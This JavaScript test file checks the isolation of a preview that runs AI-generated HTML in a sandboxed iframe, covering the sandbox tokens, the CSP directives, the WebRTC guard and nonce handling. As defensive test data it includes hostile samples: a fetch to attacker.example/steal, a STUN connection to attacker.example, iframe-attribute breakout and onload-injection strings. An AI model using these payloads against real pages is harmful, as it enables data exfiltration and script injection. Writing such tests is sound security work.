import assert from "node:assert/strict";
import test from "node:test";

import {
  HTML_PREVIEW_CDN_HOSTS,
  HTML_PREVIEW_CSP,
  HTML_PREVIEW_GUARD_SCRIPT,
  HTML_PREVIEW_WEBRTC_GLOBALS,
  HTML_PREVIEW_MAX_BYTES,
  HTML_PREVIEW_OUTER_CSP,
  HTML_PREVIEW_SANDBOX,
  buildHtmlPreviewSrcdoc,
  isHtmlPreviewSmallEnough,
  isHtmlPreviewable,
  withEmbedderNonce,
} from "../lib/htmlArtifactPreview.ts";

/**
 * The isolation of the generated-HTML preview, pinned as strings.
 *
 * These assertions are the contract: a model-written page runs with script,
 * and what keeps it away from the signed-in account is the sandbox attribute
 * and the policy below. Loosening either has to break one of these.
 */

const directives = Object.fromEntries(
  HTML_PREVIEW_CSP.split(";").map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...values] = part.split(/\s+/);
    return [name, values];
  })
);

test("the sandbox grants scripts and nothing else, and above all not the app's origin", () => {
  const tokens = HTML_PREVIEW_SANDBOX.split(/\s+/).filter(Boolean);
  assert.deepEqual(tokens, ["allow-scripts"]);
  for (const forbidden of [
    "allow-same-origin", "allow-top-navigation", "allow-top-navigation-by-user-activation", "allow-top-navigation-to-custom-protocols",
    "allow-popups", "allow-popups-to-escape-sandbox", "allow-forms", "allow-modals", "allow-downloads", "allow-pointer-lock",
    "allow-presentation", "allow-orientation-lock", "allow-storage-access-by-user-activation",
  ]) {
    assert.ok(!tokens.includes(forbidden), forbidden);
  }
});

test("the policy cuts every channel a sandboxed script would have left", () => {
  assert.deepEqual(directives["default-src"], ["'none'"]);
  assert.deepEqual(directives["connect-src"], ["'none'"], "no fetch, XHR, WebSocket or beacon");
  assert.deepEqual(directives["form-action"], ["'none'"], "no form submission");
  assert.deepEqual(directives["base-uri"], ["'none'"], "no <base> to redirect relative URLs");
  assert.deepEqual(directives["frame-src"], ["'none'"], "no nested documents");
  assert.deepEqual(directives["object-src"], ["'none'"]);
  assert.deepEqual(directives["worker-src"], ["'none'"]);
  assert.deepEqual(directives["manifest-src"], ["'none'"]);
});

test("script, style, image and font sources are inline or one of three public CDNs, never a wildcard or a scheme", () => {
  assert.deepEqual([...HTML_PREVIEW_CDN_HOSTS], ["https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net", "https://unpkg.com"]);
  for (const name of ["script-src", "style-src", "img-src", "font-src"]) {
    for (const value of directives[name]) {
      assert.ok(
        value === "'unsafe-inline'" || value === "data:" || value === "blob:" || HTML_PREVIEW_CDN_HOSTS.includes(value),
        `${name} allows ${value}`
      );
    }
  }
  assert.ok(directives["script-src"].includes("'unsafe-inline'"), "an inline chart script must run");
  assert.ok(!HTML_PREVIEW_CSP.includes("'unsafe-eval'"), "no eval or Function from a string");
  assert.ok(!/(^|\s)\*(\s|;|$)/.test(HTML_PREVIEW_CSP), "no wildcard source");
  assert.ok(!/(^|\s)https?:(\s|;|$)/.test(HTML_PREVIEW_CSP), "no whole-scheme source");
  // Pages may draw with inline images only: no image URL, on a CDN or anywhere else, can carry the page's text out.
  assert.deepEqual(directives["img-src"], ["data:", "blob:"]);
});

const unescape = (value) => value.replace(/&quot;/g, '"').replace(/&amp;/g, "&");
const split = (srcdoc) => {
  const match = /^(<!doctype html><meta http-equiv="Content-Security-Policy" content="([^"]*)"><body[^>]*>)<iframe ([^>]*?) srcdoc="([^"]*)"><\/iframe>$/.exec(srcdoc);
  assert.ok(match, "the preview is one outer document holding one frame: " + srcdoc.slice(0, 200));
  return { outerPolicy: match[2], frameAttributes: match[3], inner: unescape(match[4]) };
};

test("the page lives in a frame inside ours, and the outer document allows no frames, so the page cannot navigate itself away", () => {
  const { outerPolicy, frameAttributes } = split(buildHtmlPreviewSrcdoc("<p>x</p>"));
  assert.equal(outerPolicy, HTML_PREVIEW_OUTER_CSP);
  assert.equal(HTML_PREVIEW_OUTER_CSP, "frame-src 'none'", "only frame-src: a srcdoc child inherits every directive, so nothing else may be added here");
  assert.match(frameAttributes, /sandbox="allow-scripts"/);
  assert.doesNotMatch(frameAttributes, /allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
  assert.match(frameAttributes, /referrerpolicy="no-referrer"/);
});

test("the page's policy meta is the first element of the inner document, ahead of anything the page says", () => {
  const hostile = `<!-- <head> --><script>fetch("https://attacker.example/steal")</script>`;
  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
  assert.ok(inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
  assert.ok(inner.indexOf("Content-Security-Policy") < inner.indexOf("<script>"));
  assert.ok(inner.endsWith(hostile), "the page is carried exactly as written");
});

test("a page that tries to close the frame attribute or the outer document stays inside the inner srcdoc", () => {
  const hostile = '"></iframe><script>alert(1)</script><iframe srcdoc="';
  const srcdoc = buildHtmlPreviewSrcdoc(hostile);
  const { inner } = split(srcdoc);
  assert.ok(inner.endsWith(hostile));
  // Every quote of the page is escaped, so the attribute cannot be closed from inside: the only quote-then-tag
  // sequence left is the real end of the one wrapper frame (split() matched `[^"]*` up to it).
  assert.equal(srcdoc.split('"><\/iframe>').length - 1, 1);
});

test("the page's own doctype is replaced by ours so the frame does not fall into quirks mode", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc(String.fromCharCode(0xfeff) + '  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><body>x</body></html>'));
  assert.equal(inner.match(/<!doctype/gi).length, 1);
  assert.ok(inner.endsWith("<html><body>x</body></html>"));
  // A doctype that is not at the start is the page's content and is left alone.
  assert.equal(split(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>")).inner.match(/<!doctype/gi).length, 2);
});

test("the policy also declares CSP3's WebRTC switch, which applies the day a browser enforces it", () => {
  assert.deepEqual(directives["webrtc"], ["'block'"]);
});

test("the WebRTC guard runs right after our policy and before anything the page says", () => {
  const hostile = `<script>new RTCPeerConnection({ iceServers: [{ urls: "stun:attacker.example:3478" }] })</script>`;
  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
  const head = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;
  assert.ok(inner.startsWith(`${head}<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
  assert.ok(inner.endsWith(hostile));
  assert.ok(inner.indexOf(HTML_PREVIEW_GUARD_SCRIPT) < inner.indexOf("new RTCPeerConnection"));
});

test("in the chat the guard carries the embedding document's nonce, or the app's policy would block it", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: "bm9uY2UtdmFsdWU=" }));
  assert.ok(inner.includes(`<script nonce="bm9uY2UtdmFsdWU=">${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
  // A value that is not a nonce is not written into the attribute.
  for (const bad of ['x" onload="alert(1)', "short", ""]) {
    const { inner: plain } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: bad }));
    assert.ok(plain.includes(`<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`), bad);
  }
});

test("the guard locks every WebRTC name, media capture and nested frames, with functions it captured first", () => {
  for (const name of [
    "RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCSessionDescription", "RTCIceCandidate",
    "RTCRtpSender", "RTCRtpReceiver", "RTCRtpTransceiver", "RTCDtlsTransport", "RTCIceTransport", "RTCSctpTransport",
    "MediaStreamTrack",
  ]) {
    assert.ok(HTML_PREVIEW_WEBRTC_GLOBALS.includes(name), name);
  }
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /configurable: false/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /\/\^\(webkit\|moz\)\?RTC\//, "every RTC global, not only the listed ones");
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /mediaDevices/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /iframe,frame,frameset,object,embed/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /contentWindow/);
  // Same text in source, in srcdoc and at runtime, and it cannot end its own element early.
  assert.ok(!HTML_PREVIEW_GUARD_SCRIPT.includes("\\"));
  assert.ok(!/<\/script/i.test(HTML_PREVIEW_GUARD_SCRIPT));
  // It parses as a script.
  assert.doesNotThrow(() => new Function(HTML_PREVIEW_GUARD_SCRIPT));
});

test("a policy the page adds cannot widen ours: ours stays first and unmodified", () => {
  const page = `<meta http-equiv="Content-Security-Policy" content="default-src *"><body>hi</body>`;
  assert.ok(split(buildHtmlPreviewSrcdoc(page)).inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
});

test("only a ready HTML file within the size limit is previewed", () => {
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "htm", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "HTML", byteSize: 10, status: "ready" }), true);
  for (const format of ["svg", "xml", "js", "md", "pdf", "xlsx", "css", "txt"]) {
    assert.equal(isHtmlPreviewable({ format, byteSize: 10, status: "ready" }), false, format);
  }
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "failed" }), false);
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "blocked" }), false);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES), true);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES + 1), false);
  assert.equal(isHtmlPreviewSmallEnough(Number.NaN), false);
  assert.equal(isHtmlPreviewSmallEnough(-1), false);
});

test("the embedder's nonce goes on the page's script, style and stylesheet elements, by the browser parser, and only when it is a plain token", () => {
  const touched = [];
  let asked = null;
  const parse = () => ({
    querySelectorAll: (selector) => { asked = selector; return [1, 2, 3].map((n) => ({ setAttribute: (name, value) => touched.push([n, name, value]) })); },
    documentElement: { outerHTML: "<html>rewritten</html>" },
  });
  assert.equal(withEmbedderNonce("<p>x</p>", "abc123def456", parse), "<html>rewritten</html>");
  assert.match(asked, /script/);
  assert.match(asked, /style/);
  assert.match(asked, /link/);
  assert.deepEqual(touched.map(([, name, value]) => [name, value]), Array(3).fill(["nonce", "abc123def456"]));
  // No nonce on the embedding page, or one that could break out of an attribute: the page is untouched.
  for (const nonce of [null, undefined, "", "short", "abc\" onload=\"x", "a b c d e f g h", "x".repeat(300)]) {
    assert.equal(withEmbedderNonce("<p>x</p>", nonce, () => { throw new Error("must not parse"); }), "<p>x</p>");
  }
});
